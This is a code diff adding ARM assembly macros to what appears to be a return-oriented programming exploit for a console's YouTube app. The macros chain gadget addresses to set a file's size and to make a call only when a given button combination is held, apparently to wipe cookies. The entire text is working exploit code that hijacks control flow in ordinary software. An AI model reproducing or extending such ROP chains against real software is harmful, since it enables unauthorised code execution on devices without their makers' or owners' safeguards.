@@ -5,6 +5,8 @@ PAYLOAD_THIRD_LOC equ 0x15100000
 .include "../build/constants.s"
 
 YTB_HTTPC_HANDLE equ (YTB_HTTPC_STRUCT + 0x2C)
+YTB_PAD equ 0x1000001C
+YTB_COOKIEWIPE_KEY equ 0x00000008 ; START
 
 .macro set_lr,_lr
 	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
@@ -262,9 +264,47 @@ YTB_HTTPC_HANDLE equ (YTB_HTTPC_STRUCT + 0x2C)
 		.word flush
 .endmacro
 
+.macro fsetsize,f,size,skip_r1
+	set_lr YTB_ROP_NOP
+	.word YTB_ROP_POP_R0PC
+		.word f
+	.if skip_r1 == 0
+		.word YTB_ROP_POP_R1PC
+			.word size
+	.endif
+	.word YTB_SETFILESIZE
+.endmacro
+
 .macro control_archive,archive
 	set_lr YTB_ROP_NOP
 	.word YTB_ROP_POP_R0PC
 		.word archive
 	.word YTB_CONTROLARCHIVE
+.endmacro
+
+.macro conditional_call,adr,mask,val,arg0,arg1,func
+	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
+		.word adr ; r0 (PAD)
+	.word YTB_ROP_LDR_R0R0_POP_R4PC ; ldr r0, [r0] ; pop {r4, pc}
+		.word 0xFFFFFFFF ; r4 (garbage)
+	.word YTB_ROP_POP_R1PC
+		.word mask ; r1 (keycombo)
+	.word YTB_ROP_ANDR0R0R1_POP_R4PC
+		.word 0xFFFFFFFF ; r4 (garbage)
+	.word YTB_ROP_POP_R1PC
+		.word val ; r1
+	.word YTB_ROP_CMP_R0R1_MVNLS_R0x0_MOVHI_R0x1_POP_R4PC
+		.word 0xFFFFFFFF ; r4 (garbage)
+	.word YTB_ROP_POP_R0PC
+		.word arg0 ; r0 (dst)
+	.word YTB_ROP_POP_R1PC
+		.word arg1 ; r1 (size)
+	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
+		.word 0xFFFFFFFF ; r2 (garbage)
+		.word func ; r3 (garbage)
+		.word 0xFFFFFFFF ; r4 (garbage)
+		.word 0xFFFFFFFF ; r5 (garbage)
+		.word 0xFFFFFFFF ; r6 (garbage)
+	.word YTB_ROP_BLXNE_R3_MOV_R0x0_POP_R4PC
+		.word 0xFFFFFFFF ; r4 (garbage)
 .endmacro
